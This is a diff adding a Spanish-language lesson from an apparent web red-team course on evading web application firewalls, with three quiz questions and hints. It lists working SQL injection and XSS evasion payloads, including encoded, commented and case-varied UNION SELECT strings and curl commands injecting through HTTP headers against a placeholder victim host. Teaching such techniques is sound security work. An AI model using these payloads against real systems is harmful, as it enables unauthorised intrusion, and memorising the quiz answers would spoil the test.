@@ -1,0 +1,87 @@
+---
+index: 1
+title: "Bypass de WAF: esquivar el guardián"
+questions:
+  - id: web-red-team-t01-q01
+    prompt: "¿Qué técnica codifica el payload SQLi en hexadecimal para que el WAF no lo reconozca?"
+    hint: "0x... — MySQL lo interpreta directamente."
+    kind: text
+  - id: web-red-team-t01-q02
+    prompt: "¿Qué característica HTTP (no el body) puede contener un payload SQLi bypassando WAFs que solo inspeccionan parámetros?"
+    hint: "Cabeceras: X-Forwarded-For, User-Agent, Cookie, Referer..."
+    kind: choice
+    options:
+      - id: a
+        label: "Solo el body de la petición"
+      - id: b
+        label: "Cabeceras HTTP: X-Forwarded-For, User-Agent, Cookie — muchos WAFs no las inspeccionan"
+      - id: c
+        label: "Solo parámetros GET"
+      - id: d
+        label: "El favicon"
+  - id: web-red-team-t01-q03
+    prompt: "¿Qué separador SQL alternativo a '--' comenta el resto de la línea y es menos detectado?"
+    hint: "El '#'."
+    kind: text
+---
+
+## Las 7 capas de evasión
+
+### 1. Encoding (el básico)
+
+```text
+' OR 1=1--                          ← el WAF lo ve
+%27%20OR%201%3D1--                  ← URL encoded
+' UNION SELECT                       ← con espacios normales
+'%09UNION%09SELECT                   ← con tabs en vez de espacios
+'/**/UNION/**/SELECT                 ← comentarios inline como separadores
+```
+
+### 2. Hex encoding (MySQL)
+
+```sql
+-- En vez de: WHERE name='admin'
+WHERE name=0x61646d696e             -- hex de 'admin'
+```
+
+### 3. Cabeceras HTTP (lo que el WAF olvida)
+
+```bash
+# El WAF inspecciona ?id=... pero ¿quién inspecciona X-Forwarded-For?
+curl -H "X-Forwarded-For: ' OR 1=1--" http://victima.com/perfil
+curl -H "User-Agent: ' UNION SELECT 1,2,3--" http://victima.com/
+curl -H "Referer: <script>alert(1)</script>" http://victima.com/
+```
+
+Si el backend LOGUEA esa cabecera en SQL o la refleja en HTML → SQLi/XSS en cabeceras.
+
+### 4. Case randomization + comentarios intercalados
+
+```sql
+-- El WAF busca "UNION SELECT" (case-insensitive)
+SeLeCt                              ← case variation
+UN/**/ION SE/**/LECT                ← comentario intercalado
+UnIoN/**/SeLeCt/**/1,2,3            ← ambas técnicas
+```
+
+### 5. Chunked Transfer Encoding
+
+El WAF necesita leer el body entero para analizarlo. `Transfer-Encoding: chunked`
+fragmenta el body en trozos que individualmente no parecen un payload.
+
+### 6. HTTP Parameter Pollution
+
+```text
+?id=1&id=' OR 1=1--
+```
+
+Algunos backends toman el ÚLTIMO valor, algunos el primero — el WAF puede ver solo
+el primero (limpio) mientras el backend procesa el segundo (malicioso).
+
+### 7. Unicode/homoglifos
+
+```text
+' (comilla normal) → ‛ ′ ＇  (diferentes codepoints Unicode)
+```
+
+El WAF busca la comilla ASCII; el backend normaliza Unicode → pasa.
